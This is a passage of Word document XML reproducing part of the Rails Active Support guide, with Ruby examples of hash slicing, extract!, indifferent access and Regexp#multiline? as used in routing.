                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :uniq,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41AFCC48" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :finder_sql, :counter_sql,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="103CAE04" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :before_add, :after_add, :before_remove, :after_remove,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02EC8A5A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :extend, :readonly,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47844954" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :validate, :inverse_of</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38FE02EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03C2D554" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="647EB6D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create_has_many_reflection(association_id, options, &amp;extension)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C38CF82" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options.assert_valid_keys(valid_keys_for_has_many_association)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A7DAF07" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22B082AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="403A7F43" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/keys.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3103A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>11.5 Slicing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36662776" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Ruby has built-in support for taking slices out of strings and arrays. Active Support extends slicing to hashes:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="374C36CB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0804B522" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2, :c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 3}.slice(:a, :c)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37A595F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {:c =&gt; 3, :a =&gt; 1}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="667722E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="038319FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2, :c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 3}.slice(:b, :X)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5788D47A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {:b =&gt; 2} # non-existing keys are ignored</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="01DEE7DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the receiver responds to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>convert_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> keys are normalized:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6215"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="59F4D017" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F719BCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2}.with_indifferent_access.slice("a")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24728F6B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {:a =&gt; 1}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1FDFE27E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Slicing may come in handy for sanitizing option hashes with a white list of keys.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B00B0F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There’s also </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>slice!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which in addition to perform a slice in place returns what’s removed:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="511FE553" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="149218F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>hash = {:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43D3E9AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rest = hash.slice!(:a) # =&gt; {:b =&gt; 2}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33B8BC63" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>hash                   # =&gt; {:a =&gt; 1}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4FAD864E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/slice.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F06406B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>11.6 Extracting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE219CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>extract!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> removes and returns the key/value pairs matching the given keys.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4EE5C25F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2604612E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>hash = {:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1110F2C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rest = hash.extract!(:a) # =&gt; {:a =&gt; 1}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="523ED106" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>hash                     # =&gt; {:b =&gt; 2}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5F5EA5A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/slice.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D04F9A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>11.7 Indifferent Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E9CE7C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>with_indifferent_access</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::HashWithIndifferentAccess</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> out of its receiver:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0B4B4AF9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6EA356F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1737439132"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.with_indifferent_access["a"] # =&gt; 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6287E9D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/indifferent_access.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13224CC6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">12 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Regexp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E80AD8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">12.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>multiline?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F4BBD0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>multiline?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> says whether a regexp has the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>/m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> flag set, that is, whether the dot matches newlines.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4F2A0B19" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34D5EF02" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%r{.}.multiline?  # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E3EEE68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%r{.}m.multiline? # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F4CB49F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CB9EB03" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Regexp.new('.').multiline?                    # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6379B538" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Regexp.new('.', Regexp::MULTILINE).multiline? # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AF88B30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails uses this method in a single place, also in the routing code. Multiline regexps are disallowed for route requirements and this flag eases enforcing that constraint.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BEFB616" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C006064" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assign_route_options(segments, defaults, requirements)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="457EBFC2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A8F50BE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>requirement.multiline?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="571945A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ArgumentError, "Regexp multiline option not allowed in routing requirements: #{requirement.inspect}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F917C64" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B5E040A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30CDA2EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
